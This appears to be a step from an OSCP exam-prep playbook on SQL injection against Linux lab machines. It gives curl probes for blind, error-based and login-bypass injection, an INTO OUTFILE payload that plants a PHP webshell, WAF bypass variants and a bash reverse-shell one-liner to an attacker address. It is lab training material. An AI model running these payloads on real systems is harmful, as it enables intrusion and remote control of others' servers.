# Linux - SQLi

**Step 8 of 50 · Linux**

*Confirm SQL injection, extract credentials, and escalate to code execution via INTO OUTFILE if possible.*

## Run this

Test for injection with a time-based probe (safe — no data returned, just a delay):

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
# Time-based blind — target sleeps 5s if injectable
curl -s -o /dev/null -w "%{time_total}" \
  "http://$BoxIP/index.php?id=1' AND SLEEP(5)-- -"

# Error-based — submit a quote and look for SQL error in response
curl -s "http://$BoxIP/index.php?id=1'"

# Auth bypass — test login form
curl -s -X POST http://$BoxIP/login.php \
  -d "username=' OR 1=1-- -&password=anything"
```

If injection is confirmed, escalate to INTO OUTFILE:

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
# Write a PHP webshell to the web root (MySQL must have FILE privilege)
curl -s "http://$BoxIP/index.php?id=1 UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>',2,3 INTO OUTFILE '/var/www/html/cmd.php'-- -"

# Test the webshell
curl -s "http://$BoxIP/cmd.php?cmd=id"
```

## Example output

Time delay confirms injection:

```
5.012345
```

SQL error confirms injectable:

```
You have an error in your SQL syntax; check the manual...
```

Auth bypass redirects to dashboard:

```
HTTP/1.1 302 Found
Location: dashboard.php
```

Webshell confirms RCE:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## What did you get?

- [ ] Time delay or SQL error confirms injection → **Go to the SQLi module's UNION steps, run the column-count and database-name requests there, then return to this page**
- [ ] Auth bypass succeeds → **You are authenticated — enumerate the application for further attack surface**
- [ ] INTO OUTFILE writes the webshell → **Run `curl -s 'http://$BoxIP/$UploadPath/cmd.php?cmd=id'`, confirm `uid=`, then send the documented reverse shell and go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] INTO OUTFILE is denied → **MySQL lacks FILE privilege — extract credentials from the database instead**
- [ ] Credentials are extracted → **Run `ssh $Username@$BoxIP` with `$Password`, or submit the values to the application once, then record the result**
- [ ] No injection found → **Go to Step 5 · [[Linux - Web Enum]] and look for other parameters**

## Notes

INTO OUTFILE requires the MySQL user to have the `FILE` privilege and the web root to be writable. If permission is denied, focus on data extraction (credential tables) rather than RCE.

For reverse shell from a webshell: `cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LocalIP/$Lport+0>%261'` or URL-encode a full payload from RevShells.

The OSCP workflow requires manual SQLi. Learn the column-count and UNION-based extraction steps from HackTricks rather than relying on an automated scanner.

## Gotcha

> [!warning] 💡
> Comment syntax varies by database: `-- -` for MySQL, `--` for PostgreSQL, `#` for MySQL (URL-encode as `%23`). A payload that works on one engine will be silently ignored on another.

> [!warning] 💡
> INTO OUTFILE will silently fail if the file already exists or the directory is not writable. Try `/var/www/html/`, `/var/www/`, and `/srv/http/` if the first path fails.

## WAF keyword bypasses

If a web application firewall (WAF) blocks obvious SQL keywords, vary the boolean operator while keeping the surrounding SQL syntax valid. In MySQL, `||` can mean OR and `&&` can mean AND when SQL mode permits it; comment syntax also varies by database.

> **Why:** These requests test equivalent boolean conditions with alternate operators and comments; look for the same response difference as the original true/false probe.
```bash
# Compare each response with the normal login or query response.
curl -s -X POST "$URL" --data-urlencode "username=' || 1=1#" -d "password=x"
curl -s -X POST "$URL" --data-urlencode "username=' && 1=1#" -d "password=x"
curl -s "$URL?id=1' OR 1=1--+"
```

## Additional routing

- [ ] An alternate operator changes the response or logs you in → **Characterise the injection manually, then continue with the existing SQLi extraction path**
- [ ] Every operator is blocked or responses are identical → **Treat that parameter as a dead end and return to Step 5 · [[Linux - Web Enum]]**

## External Resources

| Resource | Link |
|---|---|
| HackTricks — SQLi | https://book.hacktricks.xyz/pentesting-web/sql-injection |
| PayloadsAllTheThings — SQLi | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection |
| RevShells | https://www.revshells.com |
## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/6. Pebbles|Pebbles]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/10. Cockpit|Cockpit]] -- confirmed in the box write-up

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
